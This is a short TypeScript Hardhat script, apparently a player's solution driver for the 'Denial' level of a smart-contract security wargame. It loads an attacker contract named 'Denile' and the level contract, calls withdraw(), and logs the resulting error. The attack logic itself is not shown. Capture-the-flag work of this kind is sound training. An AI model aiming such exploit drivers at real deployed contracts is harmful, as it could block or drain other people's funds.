import { ethers } from "hardhat"
import { LEVEL_ADDRESSES, PLAYER, ADDRESSES } from "../consts"
import { getSigner } from "../utils"
import { providers } from "ethers"

const pwn = async () => {
    const signer = await getSigner()
    const hack = await ethers.getContractAt(
        "contracts/Denial.sol:Denile",
        ADDRESSES.denile,
        signer
    )
    const target = await ethers.getContractAt(
        "contracts/Denial.sol:Denial",
        LEVEL_ADDRESSES.denial,
        signer
    )

    try {
        const pwn = await target.withdraw()
        await pwn.wait()
    } catch (error: any) {
        console.log(Object.keys(error))
        console.log(error.data)
        console.log("name", error.name)
        console.log("stack", error._stack)
    }
}

pwn()